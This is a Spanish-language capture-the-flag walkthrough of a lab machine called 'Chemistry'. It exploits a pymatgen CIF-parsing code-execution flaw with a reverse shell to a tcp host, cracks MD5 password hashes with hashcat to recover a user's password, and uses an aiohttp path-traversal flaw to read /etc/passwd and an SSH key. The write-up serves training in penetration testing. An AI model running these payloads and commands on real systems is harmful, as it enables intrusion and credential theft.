# Chemistry

Tags: [[_cve]],[[_webExploitation]],[[_cracking]],[[_internalPortAbusing]],[[_lfi]]

## Primeros pasos
(Reconocimiento).

<span style="color:#07b4f2">Organizamos</span> <span style="color:#ff2dc0">TMUX</span>.
<span style="color:#07b4f2">Activamos</span> <span style="color:#ff2dc0">VPN</span>.

Le <span style="color:#07b4f2">hacemos</span> un <span style="color:#ff2dc0">ping</span> <span style="color:#07b4f2">a</span> la <span style="color:#ff2dc0">máquina</span>. (<span style="color:#379075">Está activa o no</span>).
<span style="color:#bef202">Posible</span> <span style="color:#ff2dc0">máquina Linux</span>.

<span style="color:#07b4f2">Ponemos</span> la <span style="color:#ff2dc0">IP</span> de la <span style="color:#ff2dc0">máquina</span> <span style="color:#07b4f2">en</span> un <span style="color:#07b4f2">lugar visible</span>.
<span style="color:#07b4f2">Creamos</span> un <span style="color:#07b4f2">directorio</span> <span style="color:#07b4f2">como</span> la <span style="color:#ff2dc0">IP</span> o <span style="color:#07b4f2">nombre</span> de la <span style="color:#ff2dc0">máquina</span>.
<span style="color:#07b4f2">Creamos</span> los <span style="color:#07b4f2">directorios</span> de <span style="color:#07b4f2">trabajo</span>.

<span style="color:#bef202">Empezamos el escaneo con</span> <span style="color:#ff2dc0">NMAP</span>. <span style="color:#379075">Otro escaneo de puertos comunes por posibles falsos negativos</span>.
<span style="color:#07b4f2">Buscamos</span> <span style="color:#ff2dc0">codename</span> con <span style="color:#ff2dc0">launchpad</span>, <span style="color:#bef202">un posible</span> <span style="color:#ecacb6">Debian</span>.

+ <span style="color:#ff669c">Puertos abiertos</span>

<span style="color:#ff669c">22</span> - SSH. <span style="color:#379075">Version 8.2p1</span>
<span style="color:#ff669c">5000</span> - UPnP.


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ff669c">22</span>.
<span style="color:#07b4f2">No tengo</span> <span style="color:#ff2dc0">credenciales</span> de momento.

<span style="color:#ff669c">5000</span>.
<span style="color:#ff2dc0">whatweb</span>. <span style="color:#ff2dc0">Python3 3.9.5</span> y poco más.

<span style="color:#ff2dc0">Desde la web</span>. Es una <span style="color:#07b4f2">utilidad</span> para <span style="color:#ff2dc0">subir</span> un <span style="color:#ff2dc0">CIF</span> (<span style="color:#379075">Crystallographic Information File</span>) y <span style="color:#07b4f2">analizar</span> la <span style="color:#07b4f2">estructura</span> que tiene.
Me puedo <span style="color:#07b4f2">registrar</span>, vemos la <span style="color:#ff2dc0">subida de archivos</span>, y hay un <span style="color:#07b4f2">ejemplo</span> <span style="color:#ecacb6">.cif</span> para <span style="color:#07b4f2">descargar</span>.

Cuando el<span style="color:#07b4f2"> archivo no</span> es <span style="color:#ff2dc0">CIF</span>, el <span style="color:#ff2dc0">método</span> <span style="color:#07b4f2">no</span> es <span style="color:#07b4f2">permitido</span>, pero <span style="color:#07b4f2">si subo</span> uno <span style="color:#07b4f2">válido</span>, puedo <span style="color:#07b4f2">ver</span> su <span style="color:#07b4f2">contenido</span>.
Probando un <span style="color:#ff2dc0">SSTI</span> en un lugar, pero al <span style="color:#07b4f2">tratar</span> de <span style="color:#07b4f2">ver en</span> la <span style="color:#ff2dc0">web</span>, el <span style="color:#ff2dc0">servidor</span> tiene un <span style="color:#07b4f2">error</span>.

Interesante, tiene <span style="color:#07b4f2">su lenguaje</span>.
https://www.iucr.org/resources/cif/spec/version1.1/cifsyntax


Investigando, podemos <span style="color:#07b4f2">pensar</span> que hay una <span style="color:#ff2dc0">función</span> por detrás que <span style="color:#07b4f2">se encarga</span> de <span style="color:#ff2dc0">parsear</span> la <span style="color:#07b4f2">información</span> del <span style="color:#ecacb6">.cif</span>
Encontramos esta <span style="color:#ff2dc0">web</span>, donde <span style="color:#07b4f2">tratan</span> el <span style="color:#ecacb6">CVE-2024-23346</span>.
https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/ :    hay que crear el <span style="color:#ff2dc0">archivo CIF </span>con el <span style="color:#ff2dc0">payload</span> <span style="color:#07b4f2">bien</span>.
Lo que <span style="color:#07b4f2">podríamos</span> hacer, es <span style="color:#07b4f2">utilizar</span> el <span style="color:#07b4f2">ejemplo</span> que nos dan (<span style="color:#379075">web máquina víctima</span>), y al <span style="color:#07b4f2">final añadir</span> las <span style="color:#07b4f2">3 líneas</span> importantes, desde<span style="color:#ecacb6"> _space_group...</span> en adelante, y <span style="color:#07b4f2">añadir</span> bien el <span style="color:#ff2dc0">comando</span> a ejecutar
<span style="color:#ecacb6">system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.70/433 0>&1\'")</span>

<span style="color:#ff2dc0">Subimos</span>, damos a <span style="color:#ecacb6">View</span> y pa deeentro.

<span style="color:#bef202">Cosas extra</span>.
Encontramos este <span style="color:#07b4f2">artículo</span> donde <span style="color:#07b4f2">tocan</span> una <span style="color:#ff2dc0">librería</span> interesante.
https://github.com/DanPorter/Dans_Diffraction


## Escalada

Enumerar todo el sistema.
Es un Ubuntu Focal. Aunque toca debian en unas partes.

<span style="color:#07b4f2">Usuarios</span> válidos a <span style="color:#ff2dc0">nivel</span> de <span style="color:#ff2dc0">sistema</span>.
<span style="color:#ecacb6">root</span>
<span style="color:#ecacb6">rosa</span>
<span style="color:#ecacb6">app</span>

Hay un <span style="color:#ecacb6">/home/app/instance/database.db</span> 
Podemos interactuar con el archivo usando sqlite3.
<span style="color:#88c425">sqlite3 database.db</span> :    entro de <span style="color:#07b4f2">forma</span> <span style="color:#ff2dc0">interactiva</span>.
<span style="color:#ecacb6">.headers ON</span> :    <span style="color:#07b4f2">ver valores</span> con <span style="color:#ecacb6">select</span>.
<span style="color:#ecacb6">.mode column</span>
<span style="color:#ecacb6">.schema </span>:   ver <span style="color:#07b4f2">estructura</span> de <span style="color:#ecacb6">tablas</span>.
<span style="color:#ecacb6">select * from user;</span> :    <span style="color:#07b4f2">user</span> es la <span style="color:#ecacb6">tabla</span>.

Obtenemos.
<span style="color:#ecacb6">admin:2861debaf8d99436a10ed6f75a252abf</span>
<span style="color:#ecacb6">rosa:63ed86ee9f624c7b14f1d4f43dc251a5</span>
<span style="color:#ecacb6">app:197865e46b878d9e74a0346b6d59886a</span>
Hashes <span style="color:#ff2dc0">md5</span>, los <span style="color:#07b4f2">tratamos</span> de <span style="color:#ff2dc0">romper</span>.
<span style="color:#88c425">hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt</span> :    si <span style="color:#07b4f2">no se ve</span> la <span style="color:#ecacb6">password</span> al <span style="color:#07b4f2">final</span> del <span style="color:#ff2dc0">crackeo</span>, le metemos <span style="color:#ecacb6">--show</span>

Obtenemos.
<span style="color:#ecacb6">rosa:unicorniosrosados</span>

<span style="color:#88c425">netstat -l</span> :    vemos <span style="color:#ecacb6">localhost:http-alt</span>, investigamos y su <span style="color:#ff2dc0">default</span> <span style="color:#ff669c">port</span> es <span style="color:#ff669c">8080</span>.
<span style="color:#88c425">curl -s 127.0.0.1:8080</span> :    me <span style="color:#07b4f2">responde</span>.
<span style="color:#88c425">curl -s 127.0.0.1:8080 -I</span> :   ver <span style="color:#ff2dc0">cabeceras</span>, entre ellas
<span style="color:#ecacb6">Server: Python/3.9 aiohttp/3.9.1</span> 

<span style="color:#ecacb6">aiohttp/3.9.1 </span>tiene <span style="color:#ff2dc0">vulnerabilidades</span>.
https://github.com/jhonnybonny/CVE-2024-23334/blob/main/ :    un <span style="color:#ff2dc0">LFI</span>. Se <span style="color:#07b4f2">contempla</span> <span style="color:#ecacb6">/static</span>, pero nosotros <span style="color:#07b4f2">probamos</span> con <span style="color:#ecacb6">/assets</span>, que es donde <span style="color:#07b4f2">carga</span> <span style="color:#ff2dc0">recursos</span>.
Y para que <span style="color:#ff2dc0">curl</span> me <span style="color:#07b4f2">mantenga</span> los <span style="color:#ecacb6">../</span>, le metemos <span style="color:#ecacb6">--path-as-is</span>
<span style="color:#88c425">curl -s "http://localhost:8080/assets/../../../../../../etc/passwd" --path-as-is</span>
<span style="color:#07b4f2">Buscamos</span> una <span style="color:#ecacb6">id_rsa</span>, la obtenemos y pa deeeeentro.

FIN.
